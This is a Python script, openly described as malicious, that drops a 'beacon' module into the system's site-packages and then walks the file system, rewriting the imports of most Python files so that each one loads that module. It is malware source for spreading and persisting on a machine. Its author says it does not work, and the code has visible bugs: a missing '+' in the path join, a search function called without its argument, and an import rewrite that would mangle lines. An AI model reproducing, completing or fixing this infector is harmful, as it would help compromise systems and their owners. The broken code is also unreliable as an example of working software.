"""
Iterate through the file system and inject code into all python files
@author: degenerat3
disclaimer: this doesn't fkn work
"""

import os
import re
import site

MODULE_CODE = "beacon.py"           # The malicious module source code file
DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into /usr/lib/...
EXCLUDE_LIST = ["/path/to/yum.py", "/path/to/dnf.py" ]  # A comprehensive list of files we won't infect


def get_pkg_dir():
    arr = site.getsitepackages()
    for item in arr:
        if "/usr/lib" in item:
            return item


def read_beacon_code(filename):
    # TODO: Extract the code from the zipfile here
    
    # Until then, just read from the file directly
    with open(filename) as fil:
        contents = fil.read()
    return contents


def drop_module(dest_file_path):
    """
    Write the malicious module to the given path (likely /usr/lib/pythonX)
    @param dest_file_path: The destination of the malicious module
    @return: none
    """
    global MODULE_CODE
    mod_code = read_beacon_code(MODULE_CODE)
    with open(dest_file_path, "w") as f:
        f.write(mod_code)
    return


def find_py(pth):
    """
    Iterate through the given path and find all python files
    @param pth: the starting directory to search
    @return: an array of URIs of python files to infect
    """
    global EXCLUDE_LIST
    py_files = []
    for subdir, dirs, files in os.walk(pth):
        for fil in files:
            fname = os.path.join(subdir, fil)
            if ".py" in fname:
                if fname not in EXCLUDE_LIST:
                    py_files.append(fname)

    return py_files


def infect_file(file_path):
    """
    Import the malicious module and add the malicious function to the given file
    @param file_path: the URI of the file to infect
    @return: none
    """
    global DEST_MODULE_NAME
    old_content = ""
    with open(file_path, "r") as f:
        old_content = f.read()

    res = re.search('import(.+?)\n', old_content)
    if res:
        current_imp = res.group(1)
        print("EXISTING IMPORT: " + current_imp)
        new_imp = current_imp + "import " + DEST_MODULE_NAME + "\n"
        print("NEW IMPORT: " + new_imp)
        new_con = old_content.replace(current_imp, new_imp)
        with open(file_path, "w") as f:
            f.write(new_con)
    else:
        return


def infect():
    """
    The main function of the script; drops module and infects files
    """
    print("hacked")
    mod_dest = get_pkg_dir() + "/" DEST_MODULE_NAME
    drop_module(mod_dest)
    py_files = find_py()
    for f in py_files:
        infect_file(f)

infect()